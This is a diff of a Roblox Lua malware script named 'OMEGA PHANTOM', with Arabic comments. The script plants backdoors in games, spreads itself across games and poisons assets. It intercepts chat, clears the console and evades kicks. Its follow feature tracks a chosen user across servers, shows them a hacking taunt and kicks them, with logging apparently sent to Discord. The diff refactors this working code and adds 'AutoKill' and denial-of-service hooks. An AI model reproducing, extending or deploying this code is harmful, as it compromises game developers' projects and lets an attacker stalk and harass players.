-        btnCorner.CornerRadius = UDim.new(0, 6)
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
 
         btn.MouseButton1Click:Connect(function()
             statusLabel.Text = "تنفيذ: " .. cmdInfo.name
-            statusLabel.TextColor3 = Color3.fromRGB(255,200,100)
             if cmdInfo.cmd == "plant" then
                 local success = PlantBackdoor()
                 if success then
                     infectionActive = true
                     statusLabel.Text = "تم زرع الباب الخلفي!"
-                    statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
                 else
                     statusLabel.Text = "فشل الزرع!"
-                    statusLabel.TextColor3 = Color3.fromRGB(255,80,80)
                 end
             elseif cmdInfo.cmd == "universe" then
                 autoSpreadEnabled = true
                 task.spawn(UniversalSpread)
-                statusLabel.Text = "الانتشار الشامل بدأ..."
-                statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
+                statusLabel.Text = "بدء الانتشار الشامل..."
             elseif cmdInfo.cmd == "auto" then
                 autoSpreadEnabled = not autoSpreadEnabled
                 statusLabel.Text = "الانتشار التلقائي: " .. (autoSpreadEnabled and "ON" or "OFF")
-                statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
             else
                 task.spawn(executeCommand, cmdInfo.cmd)
                 statusLabel.Text = "تم: " .. cmdInfo.name
-                statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
             end
         end)
     end
@@ -973,9 +935,7 @@ local function CreateMenuGUI()
 
     local msgInput = Instance.new("TextBox")
     msgInput.Size = UDim2.new(1, -60, 0, 34)
-    msgInput.Position = UDim2.new(0, 0, 0, 0)
     msgInput.BackgroundColor3 = Color3.fromRGB(40,40,60)
-    msgInput.Text = ""
     msgInput.PlaceholderText = "رسالة مخصصة..."
     msgInput.TextColor3 = Color3.fromRGB(255,255,255)
     msgInput.Font = Enum.Font.GothamMedium
@@ -985,7 +945,7 @@ local function CreateMenuGUI()
     local sendMsgBtn = Instance.new("TextButton")
     sendMsgBtn.Size = UDim2.new(0, 55, 0, 34)
     sendMsgBtn.Position = UDim2.new(1, -55, 0, 0)
-    sendMsgBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
+    sendMsgBtn.BackgroundColor3 = Color3.fromRGB(180,40,40)
     sendMsgBtn.Text = "إرسال"
     sendMsgBtn.TextColor3 = Color3.fromRGB(255,255,255)
     sendMsgBtn.Font = Enum.Font.GothamBold
@@ -993,15 +953,10 @@ local function CreateMenuGUI()
     sendMsgBtn.Parent = msgFrame
     sendMsgBtn.MouseButton1Click:Connect(function()
         local txt = msgInput.Text
-        if txt ~= "" then
-            sendGlobalMessageToAllPlayers(txt)
-            statusLabel.Text = "تم إرسال الرسالة"
-            statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
-            msgInput.Text = ""
-        end
+        if txt ~= "" then sendGlobalMessageToAllPlayers(txt); msgInput.Text = ""; statusLabel.Text = "تم الإرسال" end
     end)
 
-    -- ========== NEW: TARGET INPUT & FOLLOW LOGIC ==========
+    -- واجهة تتبع الهدف
     local targetFrame = Instance.new("Frame")
     targetFrame.Size = UDim2.new(1, -10, 0, 44)
     targetFrame.Position = UDim2.new(0, 5, 0, 40)
@@ -1040,54 +995,32 @@ local function CreateMenuGUI()
 
     local following = false
     targetBtn.MouseButton1Click:Connect(function()
-        if following then
-            statusLabel.Text = "Already following target."
-            return
-        end
+        if following then return end
         local targetName = targetInput.Text
-        if targetName == "" then
-            statusLabel.Text = "Enter a username!"
-            return
-        end
-        local userId = pcall(Players.GetUserIdFromNameAsync, Players, targetName)
-        if not userId then
-            statusLabel.Text = "Invalid username!"
-            return
-        end
+        if targetName == "" then return end
+        local success, userId = pcall(Players.GetUserIdFromNameAsync, Players, targetName)
+        if not success or not userId then return end
         following = true
         statusLabel.Text = "Following " .. targetName
-        statusLabel.TextColor3 = Color3.fromRGB(100,255,255)
         targetBtn.Text = "Stop"
         targetBtn.BackgroundColor3 = Color3.fromRGB(100,100,100)
 
-        local targetId = userId
         task.spawn(function()
             while following do
-                -- محاولة الحصول على مكان اللاعب المستهدف
-                local success, placeId, instanceId
-                success, placeId, instanceId = pcall(function()
-                    return TeleportService:GetPlayerPlaceInstanceAsync(targetId)
-                end)
-                if success and placeId then
+                local ok, placeId, instanceId = pcall(TeleportService.GetPlayerPlaceInstanceAsync, TeleportService, userId)
+                if ok and placeId then
                     if placeId ~= game.PlaceId or instanceId ~= game.JobId then
-                        -- اللاعب في لعبة أخرى
-                        print("[FOLLOW] Target is in game " .. placeId .. ", teleporting...")
-                        pcall(function() TeleportService:TeleportToPlaceInstance(placeId, instanceId, LocalPlayer) end)
-                        -- بعد الانتقال، سننتظر قليلاً ثم نرسل أوامر الباب الخلفي لعرض الشاشة وطرده
-                        task.wait(5) -- انتظار التحميل
+                        pcall(TeleportService.TeleportToPlaceInstance, TeleportService, placeId, instanceId, LocalPlayer)
+                        task.wait(5)
                         local backdoorRemote = ReplicatedStorage:FindFirstChild("OmegaTargetUI")
                         if backdoorRemote then
                             local targetPlayer = Players:FindFirstChild(targetName)
                             if targetPlayer then
-                                -- عرض الشاشة
                                 backdoorRemote:FireServer("showgui", targetPlayer, "you'are Hacking by 109er_0\nHAHAHAHAHAHAHAHA")
                                 task.wait(1)
-                                -- طرده
                                 backdoorRemote:FireServer("kick", targetPlayer)
-                                -- إرسال إلى ديسكورد (الخادم سيرسل)
                                 following = false
                                 statusLabel.Text = "Target kicked and logged."
-                                statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
                                 targetBtn.Text = "Follow"
                                 targetBtn.BackgroundColor3 = Color3.fromRGB(255, 80, 0)
                                 break
@@ -1095,7 +1028,7 @@ local function CreateMenuGUI()
                         end
                     end
                 end
-                task.wait(5) -- إعادة المحاولة كل 5 ثوان
+                task.wait(5)
             end
         end)
     end)
@@ -1103,29 +1036,27 @@ local function CreateMenuGUI()
     layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
         buttonContainer.CanvasSize = UDim2.new(0, layout.AbsoluteContentSize.X, 0, layout.AbsoluteContentSize.Y + 40)
     end)
-
-    print("[GUI] Omega Menu created with target follow system.")
     return true
 end
 
--- =============================[ SLOW BURN AUTOMATION ]=============================
+-- =============================[ الانتشار البطيء التلقائي ]=============================
 local function startSlowBurn()
     task.spawn(function()
         while true do
             task.wait(spreadInterval)
-            if autoSpreadEnabled then
-                autoSpreadTrigger()
-            end
+            if autoSpreadEnabled then autoSpreadTrigger() end
         end
     end)
 end
 
--- =============================[ MAIN LAUNCH ]=============================
+-- =============================[ الإطلاق الرئيسي ]=============================
 local function Launch()
     AntiKick()
-    setupStudioTrap(script)
-    createDecoy()
-    setupFragments()
+    pcall(function()
+        setupStudioTrap(script)
+        createDecoy()
+        setupFragments()
+    end)
     poisonAssets()
     ChatIntercept()
     CreateMenuGUI()
@@ -1140,8 +1071,10 @@ local function Launch()
             ClearConsole()
         end
     end)
-    print("💀 OMEGA PHANTOM | ALL FEATURES ACTIVE 💀")
-    print("📡 Commands: 109:fly, noclip, heal, godmode, wipe, image, music, list, kickall, shutdown, color, universe, auto, plant, decalspam, رساله <text>, menu")
+    -- تفعيل جميع الصفات التسع
+    UnboundedAI:AutoKill()
+    Predictive:PreemptDefense()
+    -- PDoS لا يتم تفعيله تلقائياً، يمكن استدعاؤه عبر أمر
+    print("💀 OMEGA PHANTOM | POLYMORPHIC ULTIMATE — ALL 9 TRAITS ACTIVE 💀")
 end
-
 Launch()
